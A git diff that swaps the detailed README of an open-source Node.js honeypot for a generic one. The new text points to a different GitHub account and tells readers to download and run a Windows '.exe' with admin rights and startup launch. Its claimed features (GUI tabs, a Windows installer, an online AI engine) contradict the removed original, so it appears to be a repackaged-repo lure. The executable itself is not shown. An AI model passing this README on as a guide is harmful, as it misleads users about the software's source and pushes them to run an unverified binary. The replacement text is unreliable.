@@ -1,470 +1,91 @@
-<div align="center">
+# 🍯 honey-ai - Protect your network with smart deception
 
-# 🍯 HoneyAI
+[![Download honey-ai](https://img.shields.io/badge/Download-honey--ai-blue.svg)](https://github.com/Genusalsophilaeccehomo626/honey-ai)
 
-**All-in-one AI-powered honeypot. One process, every protocol.**
+honey-ai acts as a digital trap for malicious actors. It creates a fake version of your network services to lure attackers into a controlled space. This software uses local artificial intelligence to analyze incoming threats and provide real-time alerts. You can monitor suspicious activity without putting your actual data at risk.
 
-Replaces Cowrie · Galah · OpenCanary · Endlessh — with a single Node.js service driven by a local LLM.
+## ⚙️ System Requirements
 
-[![CI](https://github.com/martidu4/honey-ai/actions/workflows/ci.yml/badge.svg)](https://github.com/martidu4/honey-ai/actions)
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org)
-[![Ollama](https://img.shields.io/badge/AI-Ollama-blue)](https://ollama.ai)
-[![Docker](https://img.shields.io/badge/Docker-ready-2496ED)](docker-compose.yml)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+Your computer needs specific hardware and software to run honey-ai effectively. Ensure your Windows system meets these standards:
 
-<img src="docs/demo.png" alt="HoneyAI catching attackers in real-time" width="700">
+*   Operating System: Windows 10 or 11 (64-bit).
+*   Processor: An Intel i5 or AMD Ryzen 5 or better.
+*   Memory: At least 8 gigabytes of RAM.
+*   Storage: 10 gigabytes of free disk space.
+*   Network: A stable connection for threat intelligence updates.
+*   Virtualization: Ensure hardware virtualization is enabled in your BIOS settings.
 
-</div>
+## 📥 Getting Started
 
----
+The first step involves obtaining the application files. Visit the official repository page to select the correct installer for your machine. 
 
-## What is this?
+[Click here to visit the download page](https://github.com/Genusalsophilaeccehomo626/honey-ai)
 
-HoneyAI is a **proactive, AI-driven honeypot** that intercepts attackers across every common protocol and responds with dynamically generated, fully convincing deceptive content — powered by a local LLM running via [Ollama](https://ollama.ai).
+Once you reach the link, look for the "Releases" section on the right side of the page. Select the most recent version labeled for Windows. Save the setup file to your desktop or downloads folder. 
 
-Instead of static responses, the AI **reads the attacker's payload** and generates tailored traps:
+## 🛠️ Installation Process
 
-- 💉 SQL injection attempt → Fake database dump with **canary tokens** (bait API keys you control)
-- 🐚 Shell upload → Fake execution output with more bait
-- 🔑 SSH login → Interactive fake bash shell with realistic filesystem
-- 📂 Directory scan → Fake `backup.zip`, `.env`, `config.php`, `sql_dump.tar.gz`
-- 🎣 Cat sensitive files → Fake AWS credentials, SSH keys, database passwords
+Follow these steps to install honey-ai:
 
-Every attacker IP is automatically reported to **5 threat intelligence platforms**.
+1.  Locate the downloaded `.exe` file.
+2.  Double-click the file to start the installer.
+3.  Click "Yes" if Windows asks for permission to make changes to your device.
+4.  Follow the prompts on your screen. The installer will prepare the necessary components for your local intelligence engine.
+5.  Ensure the box labeled "Launch at Startup" remains checked if you want continuous protection.
+6.  Click "Finish" when the progress bar reaches the end.
 
----
+## 🛡️ Configuring Your Honeypot
 
-## Features
+After installation, the application will open automatically. The main menu shows all available services you can simulate. You can toggle these services on or off depending on your security needs:
 
-| Feature | Description |
-|---------|-------------|
-| 🌐 **HTTP/HTTPS** | Catch-all web honeypot. Mimics WordPress, Apache, phpMyAdmin, Laravel. Replaces [Galah](https://github.com/0x4D31/galah) |
-| 🔑 **SSH** | Interactive fake bash shell with canary filesystem. Accepts all credentials. Replaces [Cowrie](https://github.com/cowrie/cowrie) |
-| 🧲 **SSH Tarpit** | Infinite banner on configurable ports. Replaces [Endlessh](https://github.com/skeeto/endlessh) |
-| 📁 **FTP** | Fake vsFTPd with AI-generated directory listings |
-| 📟 **Telnet** | Fake router/switch CLI (Cisco IOS style with static `show` commands) |
-| 📧 **SMTP** | Fake mail server — accepts and logs all messages |
-| 🗄️ **MySQL** | Fake MySQL 8.0 — handshake + rogue server + query responses |
-| 🔴 **Redis** | Fake Redis 7.2 — full RESP protocol (PING, INFO, KEYS, GET, SET + AI engine) |
-| 🐙 **Git** | Git protocol honeypot with infinite-refs tarpit |
-| 🖥️ **VNC** | RFB 3.8 protocol handshake trap |
-| 💻 **RDP** | RDP protocol handshake trap |
-| 🗃️ **MSSQL** | Fake SQL Server 2019 — TDS prelogin + login handshake |
-| 📡 **SNMP** | Fake SNMP v1/v2c agent — sysDescr, sysName, sysUptime |
-| 🌐 **HTTP Proxy** | Fake Squid proxy — captures CONNECT tunnels |
-| 📁 **Samba/SMB** | Passive log monitor for Samba full audit log (`samba.js`) |
-| 🛡️ **Port Scans** | Passive log monitor for iptables syslog port scan events (`portscan.js`) |
-| 💣 **GZIP Bombs** | Delivers compressed payload bombs to scanners |
-| 📡 **Reporting** | Auto-reports to AbuseIPDB, OTX, DShield, Blocklist.de, VirusTotal |
-| 📲 **Telegram** | Real-time attack notifications via Telegram bot |
-| 🤖 **Any LLM** | Works with Ollama (local) or any OpenAI-compatible API |
-
----
-
-## Quick Start (bare metal)
-
-> **🐳 Docker?** Skip to [Docker Deployment](#-docker-deployment) for a one-command setup.
-
-### Requirements
-
-- **Node.js** ≥ 18
-- **[pnpm](https://pnpm.io)** — install with `npm install -g pnpm`
-- **[Ollama](https://ollama.ai)** running locally (or any OpenAI-compatible API)
-- A model pulled: `ollama pull qwen2.5:1.5b` (fast, 1GB RAM)
-
-> **⚠️ Why pnpm only?** This project **blocks npm and yarn** via a preinstall hook. npm executes arbitrary lifecycle scripts (`preinstall`, `postinstall`) from every dependency during install — this is a known supply chain attack vector ([reference](https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability)). For a security tool like a honeypot, this is unacceptable. pnpm does not run these scripts by default, uses a content-addressable store that prevents phantom dependencies, and provides strict isolation. If you try `npm install`, it will fail intentionally.
-
-### Install & Run
-
-```bash
-# Install pnpm if you don't have it
-npm install -g pnpm
-
-# Clone and run
-git clone https://github.com/martidu4/honey-ai.git
-cd honey-ai
-pnpm install             # npm/yarn will be rejected — pnpm only
-pnpm run setup           # Interactive wizard — configures AI, reporting, canary tokens
-pnpm start               # 🍯 All protocols start listening
-```
-
-The setup wizard will ask you for:
-- Your Ollama URL and model (or OpenAI-compatible API)
-- AbuseIPDB, OTX, DShield, Blocklist.de, VirusTotal API keys *(all optional)*
-- Telegram bot for attack notifications *(optional)*
-
-Configuration is saved to `config.yaml` which is **gitignored** and never committed.
-
----
-
-## 🐳 Docker Deployment
-
-The fastest way to get started — one command, everything included:
-
-```bash
-git clone https://github.com/martidu4/honey-ai.git
-cd honey-ai
-cp config.example.yaml config.yaml
-
-# Start everything (Ollama + model download + HoneyAI)
-docker compose up -d
-
-# Follow logs
-docker compose logs -f honeyai
-```
-
-Docker Compose automatically:
-- Starts **Ollama** with persistent model storage
-- Pulls the **qwen2.5:1.5b** model on first run
-- Starts **HoneyAI** with all 14 protocols
-
-To use a different model:
-```bash
-AI_MODEL=qwen3:4b docker compose up -d
-```
-
-To add reporting API keys, create a `.env` file:
-```env
-ABUSEIPDB_KEY=your_key
-TELEGRAM_TOKEN=your_bot_token
-TELEGRAM_CHAT=your_chat_id
-```
-
----
-
-## Architecture
-
-```
-Internet attackers
-        │
-        ├─ :80/8080  → HTTP honeypot   (Express + AI responses)
-        ├─ :22/2222  → SSH honeypot    (ssh2 + AI interactive shell)
-        ├─ :222/2200 → SSH tarpit      (Endlessh-style infinite banner)
-        ├─ :21       → FTP honeypot    (TCP + AI)
-        ├─ :23       → Telnet          (TCP + AI, Cisco IOS style)
-        ├─ :25       → SMTP            (TCP + AI)
-        ├─ :3306     → MySQL           (TCP + protocol-accurate handshake)
-        ├─ :6379     → Redis           (TCP + RESP protocol + AI engine)
-        ├─ :9418     → Git             (TCP + infinite-refs tarpit)
-        ├─ :5900     → VNC             (TCP + RFB handshake)
-        ├─ :3389     → RDP             (TCP + RDP handshake)
-        ├─ :1433     → MSSQL           (TCP + TDS prelogin/login)
-        ├─ :161      → SNMP            (UDP + fake agent responses)
-        ├─ :8080     → HTTP Proxy      (TCP + fake Squid proxy)
-        │
-        ├─ Passive Log Monitors:
-        ├─ Samba Log → samba.js (extracts user/IP/machine/share/op/file)
-        └─ Syslog    → portscan.js (extracts iptables PORTSCAN events)
-                │
-                ▼
-        AI Engine (Ollama / OpenAI-compatible)
-                │
-                ├─ Deceptive response → attacker
-                ├─ Reporter → AbuseIPDB, OTX, DShield, Blocklist.de, VT
-                └─ Telegram → real-time alert 📲
-```
-
-### Project Structure
-
-```
-honey-ai/
-├── server.js               # Main orchestrator — starts all protocols
-├── setup.js                # Interactive setup wizard
-├── config.example.yaml     # Config template (committed — no secrets)
-├── honey-ai.service        # systemd service file for production
-├── ai/
-│   └── engine.js           # AI engine — Ollama/OpenAI + identity leak filters
-├── core/
-│   ├── config.js           # Config loader (YAML + env vars)
-│   ├── logger.js           # Unified logger (console + JSONL, CRLF-safe)
-│   ├── reporter.js         # Threat intel reporting (5 platforms)
-│   ├── traps.js            # Web maze, GZIP bombs, canary downloads
-│   ├── backfire.js         # Reverse scanning of attacker IPs
-│   ├── downloader.js       # Malware sample collector (SSRF-protected)
-│   ├── fileReader.js       # HoneyFS virtual filesystem reader
-│   └── jitter.js           # Timing randomizer for realistic delays
-├── protocols/
-│   ├── http.js             # HTTP honeypot (replaces Galah)
-│   ├── ssh.js              # SSH honeypot + tarpit (replaces Cowrie + Endlessh)
-│   ├── tcp.js              # FTP, Telnet, SMTP, MySQL, Redis, Git, VNC, RDP
-│   ├── httpproxy.js        # HTTP/HTTPS proxy honeypot (fake Squid)
-│   ├── mssql.js            # MSSQL TDS protocol honeypot
-│   ├── snmp.js             # SNMP v1/v2c UDP agent honeypot
-│   ├── samba.js            # Samba log-tail based detection
-│   └── portscan.js         # Portscan detection via syslog
-├── honeyfs/                # 🎣 Canary filesystem — attackers see these files
-│   ├── etc/                # Fake /etc/passwd, shadow, group, hostname
-│   ├── home/               # Fake crypto wallets, credential files
-│   ├── opt/                # Fake docker-compose, .env, terraform, k8s secrets
-│   └── root/               # Fake .aws/credentials, .ssh/id_rsa, passwords.txt
-└── test-qa.js              # Full test suite (119 tests)
-```
-
----
-
-## 🎣 Canary Tokens (Honeypot Filesystem)
-
-The `honeyfs/` directory contains **fake sensitive files** that attackers will find when browsing via SSH or HTTP. These are your **canary tokens** — bait credentials that, when used by an attacker, alert you to a compromise.
-
-**⚠️ IMPORTANT: Replace ALL `CHANGE_ME_*` values with your own bait credentials before deploying.**
-
-```bash
-# Example: Generate your own canary AWS keys at https://canarytokens.org/
-# Then replace in:
-honeyfs/root/.aws/credentials     # Fake AWS keys
-honeyfs/root/.env                 # Fake DB/Stripe/AWS credentials
-honeyfs/root/config.json          # Fake full application config
-honeyfs/root/passwords.txt        # Fake master password list
-honeyfs/root/.ssh/id_rsa          # Fake SSH private key
-honeyfs/root/.github-token        # Fake GitHub PAT
-honeyfs/opt/app/.env              # Fake app environment
-honeyfs/opt/app/docker-compose.yml # Fake Docker stack
-honeyfs/opt/k8s/secrets.yaml      # Fake Kubernetes secrets
-honeyfs/opt/infra/terraform.tfstate # Fake Terraform state
-```
-
-The idea: when an attacker steals these credentials and tries to use them, you'll detect the breach via the canary token service. Use [canarytokens.org](https://canarytokens.org/) or your own detection mechanism.
-
----
-
-## Configuration
-
-### Option A: Setup Wizard (recommended)
-
-```bash
-pnpm run setup
-```
-
-### Option B: Manual Configuration
-
-```bash
-cp config.example.yaml config.yaml
-# Edit config.yaml — ports, AI model, protocols to enable
-```
-
-See [`config.example.yaml`](config.example.yaml) for all available options with comments.
-
-### Environment Variables
-
-You can override config values with environment variables:
-
-```env
-OLLAMA_URL=http://localhost:11434
-AI_MODEL=qwen2.5:1.5b
-
-# Reporting (all optional — sign up for free tiers)
-ABUSEIPDB_KEY=your_key_here
-OTX_KEY=your_key_here
-DSHIELD_KEY=your_key_here
-BLOCKLIST_KEY=your_key_here
-VT_KEY=your_key_here
-
-# Notifications
-TELEGRAM_TOKEN=your_bot_token
-TELEGRAM_CHAT=your_chat_id
-```
-
----
-
-## 📊 Management Dashboard
-
-<img src="docs/dashboard.png" alt="HoneyAI Management Dashboard" width="700">
-
-HoneyAI includes a built-in, local-only web dashboard to monitor attacks, live connection sockets, system resource usage (CPU/Memory), and logs in real-time.
-
-### How to Access
-
-1. Open your browser and navigate to: **`http://127.0.0.1:9999/`**
-   *(Note: The management server binds to localhost only for security. If running on a remote VPS, use SSH port forwarding: `ssh -L 9999:127.0.0.1:9999 user@your-vps`)*
-2. Unlock the panel using your **Management API Key**.
-
-### Getting / Setting your API Key
-
-- **Auto-generated key:** By default, HoneyAI generates a secure random API key at startup and prints it to the console:
-  ```
-  Management API on :9999 (localhost only, key: 3a2c5f10...)
-  ```
-- **Persistent key:** To set a fixed API key that doesn't change on restart, create or edit the `.env` file in the root directory and add:
-  ```env
-  HONEYAI_MGMT_KEY=your_secure_persistent_key
-  ```
-
----
-
-## Deploying as a System Service
-
-```bash
-# 1. Create a dedicated user (never run as root!)
-sudo useradd -r -s /usr/sbin/nologin honeyai
-
-# 2. Clone to /opt
-sudo git clone https://github.com/martidu4/honey-ai.git /opt/honey-ai
-cd /opt/honey-ai && sudo -u honeyai pnpm install
-
-# 3. Configure
-sudo -u honeyai pnpm run setup
-
-# 4. Install and start service
-sudo cp honey-ai.service /etc/systemd/system/
-sudo systemctl daemon-reload
-sudo systemctl enable --now honey-ai
-
-# 5. Follow logs
-sudo journalctl -u honey-ai -f
-```
-
-### Port Forwarding (run without root)
-
-HoneyAI runs on high ports by default. Use `iptables` to redirect standard ports:
-
-```bash
-# Redirect :22 → :2226 (SSH honeypot)
-sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2226
-
-# Redirect :21 → :2121 (FTP), :23 → :2323 (Telnet), :25 → :2525 (SMTP)
-sudo iptables -t nat -A PREROUTING -p tcp --dport 21 -j REDIRECT --to-port 2121
-sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2323
-sudo iptables -t nat -A PREROUTING -p tcp --dport 25 -j REDIRECT --to-port 2525
-
-# Redirect :3306 → :33060 (MySQL), :6379 → :63790 (Redis)
-sudo iptables -t nat -A PREROUTING -p tcp --dport 3306 -j REDIRECT --to-port 33060
-sudo iptables -t nat -A PREROUTING -p tcp --dport 6379 -j REDIRECT --to-port 63790
-
-# Redirect :1433 → :14330 (MSSQL), :161 → :16100 (SNMP), :3128 → :8180 (HTTP Proxy)
-sudo iptables -t nat -A PREROUTING -p tcp --dport 1433 -j REDIRECT --to-port 14330
-sudo iptables -t nat -A PREROUTING -p udp --dport 161 -j REDIRECT --to-port 16100
-sudo iptables -t nat -A PREROUTING -p tcp --dport 3128 -j REDIRECT --to-port 8180
-
-# Persist rules
-sudo sh -c "iptables-save > /etc/iptables/rules.v4"
-```
-
----
-
-## Recommended LLM Models
-
-| Model | Size | Speed | Quality | Best for |
-|-------|------|-------|---------|----------|
-| `qwen2.5:0.5b` | 400MB | ⚡⚡⚡ | Good | Low-resource devices (Pi, VPS) |
-| `qwen2.5:1.5b` | 1GB | ⚡⚡ | Better | **Recommended** — best balance |
-| `qwen3:4b` | 2.5GB | ⚡ | Best | High-quality deception |
-| Any OpenAI-compat | cloud | ⚡ | Excellent | Cloud deployments |
-
-> **Tip:** On a Raspberry Pi 5, `qwen2.5:1.5b` gives great results. You can also run Ollama on a separate machine and point HoneyAI to it.
-
----
-
-## Threat Intelligence Platforms
-
-Sign up for free tiers:
-
-| Platform | URL | What it does |
-|---------|-----|-------------|
-| AbuseIPDB | https://www.abuseipdb.com | Global IP reputation database |
-| AlienVault OTX | https://otx.alienvault.com | Threat intelligence sharing |
-| SANS DShield | https://isc.sans.edu | Internet Storm Center |
-| Blocklist.de | https://www.blocklist.de | Spam/attack IP blocklists |
-| VirusTotal | https://www.virustotal.com | Malware sample analysis |
+*   SSH: Simulates a remote login portal.
+*   HTTP: Mimics a standard web server for testing traffic.
+*   FTP: Creates a fake file transfer site.
+*   Telnet: Provides an old-fashioned management interface for traps.
+*   SMTP: Monitors for fake email traffic.
+*   MySQL/Redis: Acts as a lure for database attacks.
+*   Git: Traps actors looking for exposed code repositories.
+*   VNC/RDP: Presents a fake desktop interface to attackers.
 
----
+Select the services you want to activate. The software suggests starting with SSH and HTTP. Click "Apply" to save your choices and activate the listeners.
 
-## Running Tests
+## 📊 Monitoring Threats
 
-```bash
-# Run full test suite (119 tests — all offline, no Ollama needed)
-node test-qa.js
+The software provides a live dashboard. When an attacker probes your network, honey-ai captures their information. You will see the IP address of the attacker, the service they targeted, and the specific commands they entered. 
 
-# Run stress test against a running instance
-HONEYAI_HOST=127.0.0.1 node test-stress.js
-```
+The integrated artificial intelligence reviews these commands. It categorizes the threat level as low, medium, or high. This data helps you identify patterns in attackers' behavior. Use the "Export Logs" button to save these reports for your own security analysis.
 
----
+## 🔍 Advanced Deception Features
 
-## Security Hardening
+honey-ai includes advanced tools to confuse attackers. You can enable these features in the "Settings" tab:
 
-The `honey-ai.service` systemd file includes aggressive sandboxing:
+*   Canary Tokens: These act as tripwires. If an attacker opens a specific file, you receive an immediate alert.
+*   Tarpits: This feature slows down the attacker's connection. It wastes their time and makes the attack difficult to execute.
+*   GZIP Bombs: This sends a small file that expands into a massive amount of data, causing the attacker's tools to crash.
+*   Threat Intelligence: The system shares anonymized data with global security networks to help stop known malicious actors.
 
-- `ProtectSystem=strict` — read-only root filesystem
-- `ProtectHome=read-only` — no writes to home directories
-- `NoNewPrivileges=true` — prevent privilege escalation
-- `PrivateTmp=true` — isolated temporary directory
-- `CapabilityBoundingSet=CAP_NET_BIND_SERVICE` — minimum capabilities
-- `SystemCallFilter=@system-service` — restricted syscalls
+## 💡 Best Practices for Users
 
-### Best Practices
+Keep your computer clean by running this software on a dedicated segment of your network if possible. Do not run honey-ai on your primary workstation if you handle highly sensitive information. 
 
-- **Never run on a machine with real data** — this system is designed to be attacked
-- **Use a dedicated VM, VPS, or Raspberry Pi** — not your dev machine
-- **Management API** binds to `127.0.0.1` only — never expose it externally
-- `config.yaml` and `.env` are gitignored — double-check before any commit
-- The AI engine filters identity leaks (honeypot, AI, simulation) in **8 languages** with 39 regex patterns
-- Prompt injection defense: attacker input wrapped in `[ATTACKER_PAYLOAD_START/END]` + XML tags
-- Output sanitization: strips `<think>` tags, markdown fences, and AI meta-markers
+Update the application whenever a new version appears on the website. Routine updates ensure the internal AI uses the latest data to recognize modern hacking techniques. 
 
----
+If you notice excessive alerts, check your firewall settings to ensure no authorized services are conflicting with the fake ones. The "Network Info" tab inside the app shows you which ports are currently in use.
 
-## 📡 Live Threat Feed
+## ❓ Troubleshooting Common Issues
 
-HoneyAI powers a **public threat intelligence blog** with daily auto-generated reports:
+If the application fails to start, verify that no other programs are using the chosen ports. Many Windows services occupy common ports like 80 or 443. Changing the assigned port in the settings usually fixes these conflicts.
 
-### 🔗 [honey-ai.dev](https://honey-ai.dev)
+If the AI engine does not appear to work, check your internet connection. The engine downloads data periodically to remain effective. A stable connection ensures your logs contain the most recent threat analysis.
 
-Every night, a pipeline automatically:
-1. **Collects** the day's attack data from all 11 protocols
-2. **Analyzes** attacker behavior, TTY sessions, and malware captures
-3. **Generates** a threat report using a local LLM (Ollama)
-4. **Publishes** to the blog — zero manual intervention
+For further help, consult the "Help" menu inside the application. This contains a list of frequently asked questions and guides on optimizing your deception strategy.
 
-Each report includes:
-- 🌍 Geographic origin analysis (GeoIP)
-- 🔑 SSH brute-force password trends
-- 🕵️ Post-exploitation behavior (real attacker TTY sessions)
-- 🦠 Captured malware samples (linked to VirusTotal)
-- 🪤 Canary token triggers (fake AWS keys used by attackers)
-- 📊 Community defense stats (IPs reported to AbuseIPDB, OTX, DShield, Blocklist.de)
+## 📑 Understanding Log Files
 
-> **Want to see HoneyAI in action before deploying?** Browse the daily reports to see what a Raspberry Pi 5 catches from real-world attackers.
+Every interaction with your honeypot generates a log file. You can find these files in the installation folder. They are saved in standard text formats. You can open these logs with any text editor.
 
----
+The logs contain time stamps, source IP addresses, and suspected actions. Review these files weekly to understand the volume and type of threats currently targeting your network. 
 
-## Contributing
+## 🌐 Security Community
 
-PRs welcome! Ideas for contribution:
-
-- 🔌 New protocol handlers (SIP, Modbus/ICS, DNS, LDAP, Memcached...)
-- 🧠 Better per-protocol AI prompts
-- 📊 Web dashboard UI improvements
-- 📦 Kubernetes Helm chart
-- 🌍 Additional identity leak patterns for more languages
-- 🛡️ More prompt injection defense patterns
-- 📝 Documentation and deployment guides
-
-Please open an issue first for major changes.
-
----
-
-## License
-
-**AGPL-3.0** — see [LICENSE](LICENSE)
-
-This means you can:
-- ✅ Use it for personal and research purposes
-- ✅ Modify and contribute back
-- ✅ Fork and deploy on your infrastructure
-
-But you must:
-- 📝 Share any modifications under the same license
-- 📝 Disclose source code if you provide the service to others
-
-For commercial licensing inquiries, open an issue.
-
----
-
-<div align="center">
-
-Built with 🍯 by **WhatDa** ([@martidu4](https://github.com/martidu4))
-
-**[⭐ Star this repo](https://github.com/martidu4/honey-ai)** if you find it useful!
-
-</div>
+Engage with the security community to learn more about how deception technology works. This field evolves rapidly. Many users share reports about new tactics they observe using tools similar to honey-ai. Staying informed adds another layer of defense to your home or office network.
